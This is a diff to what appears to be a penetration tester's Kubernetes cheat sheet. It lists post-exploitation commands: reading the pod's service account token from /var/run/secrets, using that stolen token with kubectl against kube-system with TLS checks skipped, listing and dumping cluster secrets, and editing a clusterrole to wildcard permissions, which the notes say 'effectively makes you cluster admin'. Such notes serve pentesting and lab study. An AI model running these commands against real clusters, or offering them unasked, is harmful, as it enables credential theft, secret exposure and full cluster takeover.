@@ -42,20 +42,35 @@ _/ ___\ |  |  \ _/ __ \ \__  \ \   __\     /  ___/|  |  \ _/ __ \_/ __ \\   __\
 ------------------------------------------------------------------------------------------------------------------------------------
 
 - curl localhost:8080
-   - (from inside a nodeJS pod, we query the nodeJS server)
+   - ( from inside a nodeJS pod, we query the nodeJS server )
+   
 - cat /var/run/secrets/kubernetes.io/serviceaccount/token
-   - (view service account token!)
+   - ( view service account token! )
+   
 - kubectl --insecure-skip-tls-verify -shttps://[IP]:PORT/ --token="[TOKEN]" -n kube-system get pods
-   - RCE with compromised SA token
+   - ( RCE with compromised SA token )
+   
 - kubectl create [POD-MANIFEST].yml
+
 - kubectl logs [POD]
+
 - kubectl auth can-i --list
+
 - cat /proc/self/cgroup
    - ( answers the question 'Am I in a container?' )
+   
 - kubectl -n kube-system get secrets 
    - ( list secrets )
+   
 - kubectl -n kube-system get secret [SECRET-NAME] -o json
-   -
+   - (abuse 'get secrets' permissions )
+
+- kubectl --token=[SA-TOKEN] get clusterroles
+- kubectl --token=[SA-TOKEN] edit clusterrole <SA-CLUSTER-ROLE-NAME>
+   - ( abuse 'escalate' permissions )
+   - ( when editing, put '*' under API groups, resources, and verbs )
+   - ( this effectively makes you cluster admin! )
+   
 ------------------------------------------------------------------------------------------------------------------------------------
                                             ports
 ------------------------------------------------------------------------------------------------------------------------------------
